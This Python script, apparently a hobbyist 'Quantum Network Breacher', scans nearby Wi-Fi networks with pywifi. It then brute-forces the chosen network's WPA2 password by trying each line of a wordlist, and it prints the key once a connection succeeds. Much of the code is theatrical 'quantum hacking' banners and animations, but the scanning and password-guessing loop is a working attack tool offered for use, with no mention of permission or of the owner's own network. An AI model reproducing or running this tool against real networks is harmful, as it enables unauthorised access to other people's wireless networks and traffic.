import pywifi
from pywifi import const
import time
import colorama
from colorama import Fore, Back, Style, init
import random
import sys
import threading
import os
import shutil
import itertools

# Initialize colorama for cross-platform color support
init(autoreset=True)

class UltimateNetworkBreacher:
    def __init__(self):
        self.terminal_width = shutil.get_terminal_size().columns
        self.breach_quotes = [
            "We're about to hack REALITY itself!",
            "Quantum frequencies bow to MY ALGORITHM!",
            "This isn't hacking. This is ART!",
            "SCIENCE JUST GOT WEAPONIZED!",
            "PREPARE FOR DIGITAL APOCALYPSE!",
            "I AM THE NETWORK NIGHTMARE!",
            "QUANTUM DESTRUCTION PROTOCOL ENGAGED!"
        ]
        self.hacking_animations = [
            "▓▓▓░░░░░░░ INITIATING QUANTUM PROBE",
            "▓▓▓▓▓░░░░░ BREAKING CRYPTOGRAPHIC BARRIERS", 
            "▓▓▓▓▓▓▓░░░ QUANTUM ALGORITHMS ENGAGING",
            "▓▓▓▓▓▓▓▓▓░ REALITY MANIPULATION IN PROGRESS",
            "▓▓▓▓▓▓▓▓▓▓ ABSOLUTE NETWORK DOMINATION!"
        ]

    def center_text(self, text, width=None):
        """Center text in terminal with optional width."""
        if width is None:
            width = self.terminal_width
        return text.center(width)

    def typewriter_effect(self, text, color=Fore.GREEN, delay=0.03):
        """Cinematic typing effect for dramatic text reveal."""
        for char in text:
            sys.stdout.write(color + char + Style.RESET_ALL)
            sys.stdout.flush()
            time.sleep(delay)
        print()

    def epic_banner(self):
        """ULTIMATE Quantum Network Breacher Banner"""
        os.system('cls' if os.name == 'nt' else 'clear')
        banner = f"""{Fore.CYAN}
{self.center_text('╔' + '═' * 70 + '╗')}
{self.center_text(f'{Fore.MAGENTA}🌐 QUANTUM NETWORK BREACHER: ABSOLUTE EDITION 🚀{Fore.CYAN}')}
{self.center_text('╚' + '═' * 70 + '╝')}

{Fore.RED}{self.center_text('WARNING: REALITY DISTORTION PROTOCOL ACTIVE')}{Style.RESET_ALL}

{Fore.YELLOW}{self.center_text('INITIALIZING QUANTUM CYBER INVASION...')}{Style.RESET_ALL}
"""
        print(banner)
        time.sleep(1)
        self.typewriter_effect(
            self.center_text(f"{Fore.GREEN}[SYSTEM] {random.choice(self.breach_quotes)}"), 
            color=Fore.MAGENTA
        )

    def quantum_loading_sequence(self):
        """Cinematic loading sequence with spinning animation."""
        spinner = itertools.cycle([
            f'{Fore.RED}|{Style.RESET_ALL}', 
            f'{Fore.YELLOW}/{Style.RESET_ALL}', 
            f'{Fore.GREEN}-{Style.RESET_ALL}', 
            f'{Fore.BLUE}\\{Style.RESET_ALL}'
        ])
        
        def animate():
            for _ in range(50):
                sys.stdout.write('\r' + self.center_text(next(spinner) + " QUANTUM CALIBRATION IN PROGRESS"))
                sys.stdout.flush()
                time.sleep(0.1)
        
        thread = threading.Thread(target=animate)
        thread.start()
        thread.join(5)
        print()

    def scan_networks(self):
        """Network scanning with MAXIMUM drama."""
        self.quantum_loading_sequence()
        
        wifi = pywifi.PyWiFi()
        iface = wifi.interfaces()[0]
        iface.scan()
        time.sleep(2)
        results = iface.scan_results()
        
        print(f"\n{Fore.MAGENTA}{self.center_text(':: QUANTUM NETWORK FREQUENCIES DETECTED ::')}{Style.RESET_ALL}\n")
        
        networks = []
        for index, network in enumerate(results):
            ssid = network.ssid
            signal_strength = network.signal
            
            if ssid and ssid not in networks:
                networks.append(ssid)
                
                signal_status = (
                    f"{Back.GREEN}{Fore.BLACK} QUANTUM STABLE {Style.RESET_ALL}" if signal_strength > -50 else
                    f"{Back.YELLOW}{Fore.BLACK} QUANTUM FLUCTUATING {Style.RESET_ALL}" if signal_strength > -60 else
                    f"{Back.RED}{Fore.WHITE} QUANTUM UNSTABLE {Style.RESET_ALL}"
                )
                
                print(
                    self.center_text(
                        f"{Fore.CYAN}[FREQ-{index + 1}]{Style.RESET_ALL} "
                        f"{Fore.WHITE}{ssid}{Style.RESET_ALL} "
                        f"| {signal_status}"
                    )
                )
        
        return networks

    def breach_network(self, ssid, wordlist_path):
        """Network infiltration with MAXIMUM QUANTUM DRAMA."""
        print(f"\n{Fore.YELLOW}{self.center_text(f'[BREACH PROTOCOL] Targeting: {ssid}')}{Style.RESET_ALL}")
        
        try:
            with open(wordlist_path, 'r') as file:
                passwords = file.read().splitlines()
            
            total_passwords = len(passwords)
            print(
                f"{Fore.CYAN}"
                f"{self.center_text(f'[QUANTUM COMPUTATION] Potential Access Keys: {total_passwords}')}"
                f"{Style.RESET_ALL}"
            )
            
            for index, password in enumerate(passwords, 1):
                if index % 5 == 0:
                    print(
                        f"{Fore.YELLOW}"
                        f"{self.center_text('[HACKING] ' + random.choice(self.hacking_animations))}"
                        f"{Style.RESET_ALL}"
                    )
                
                breach_percentage = (index / total_passwords) * 100
                sys.stdout.write(
                    '\r' + self.center_text(
                        f"{Fore.GREEN}[BREACH PROGRESS] "
                        f"{'█' * int(breach_percentage // 5)}{'-' * (20 - int(breach_percentage // 5))} "
                        f"{breach_percentage:.2f}% "
                        f"(Quantum Keys: {index}/{total_passwords}){Style.RESET_ALL}"
                    )
                )
                sys.stdout.flush()
                
                if self._attempt_network_connection(ssid, password):
                    print(f"\n\n{Fore.MAGENTA}{self.center_text('[🚀 ABSOLUTE BREACH SUCCESSFUL 🚀]')}{Style.RESET_ALL}")
                    return
            
            print(
                f"\n\n{Fore.RED}"
                f"{self.center_text('[BREACH FAILED] QUANTUM RESISTANCE DETECTED')}"
                f"{Style.RESET_ALL}"
            )
        
        except FileNotFoundError:
            print(
                f"{Fore.RED}"
                f"{self.center_text('[ERROR] QUANTUM KEY DATABASE CORRUPTED')}"
                f"{Style.RESET_ALL}"
            )

    def _attempt_network_connection(self, ssid, password):
        """QUANTUM CONNECTION WITH MAXIMUM INTENSITY."""
        wifi = pywifi.PyWiFi()
        iface = wifi.interfaces()[0]
        iface.disconnect()
        time.sleep(1)
        
        if iface.status() == const.IFACE_DISCONNECTED:
            profile = pywifi.Profile()
            profile.ssid = ssid
            profile.auth = const.AUTH_ALG_OPEN
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            profile.key = password
            
            iface.remove_all_network_profiles()
            tmp_profile = iface.add_network_profile(profile)
            iface.connect(tmp_profile)
            
            time.sleep(5)
            
            if iface.status() == const.IFACE_CONNECTED:
                print(
                    f"\n{Fore.GREEN}"
                    f"{self.center_text('[QUANTUM HANDSHAKE: ABSOLUTE CONFIRMATION]')}"
                    f"{Style.RESET_ALL}"
                )
                print(
                    f"{Fore.CYAN}"
                    f"{self.center_text(f'Network: {ssid}')}"
                    f"{Style.RESET_ALL}"
                )
                print(
                    f"{Fore.GREEN}"
                    f"{self.center_text(f'Access Key: {password}')}"
                    f"{Style.RESET_ALL}"
                )
                return True
        
        return False

def main():
    import shutil  # Imported here to avoid global import
    
    breacher = UltimateNetworkBreacher()
    breacher.epic_banner()
    
    networks = breacher.scan_networks()
    
    if networks:
        try:
            choice = int(
                input(
                    f"\n{Fore.YELLOW}"
                    f"{breacher.center_text('Select Quantum Frequency [1-' + str(len(networks)) + ']: ')}"
                    f"{Style.RESET_ALL}"
                )
            ) - 1
            selected_ssid = networks[choice]
            
            print(
                f"{Fore.MAGENTA}"
                f"{breacher.center_text(f'[TARGETING] Quantum Frequency: {selected_ssid}')}"
                f"{Style.RESET_ALL}"
            )
            
            wordlist_file = 'words.txt'
            breacher.breach_network(selected_ssid, wordlist_file)
        
        except (ValueError, IndexError):
            print(
                f"{Fore.RED}"
                f"{breacher.center_text('[ERROR] QUANTUM FREQUENCY SELECTION FAILED')}"
                f"{Style.RESET_ALL}"
            )
    else:
        print(
            f"{Fore.RED}"
            f"{breacher.center_text('[SYSTEM] NO QUANTUM FREQUENCIES DETECTED')}"
            f"{Style.RESET_ALL}"
        )

if __name__ == "__main__":
    main()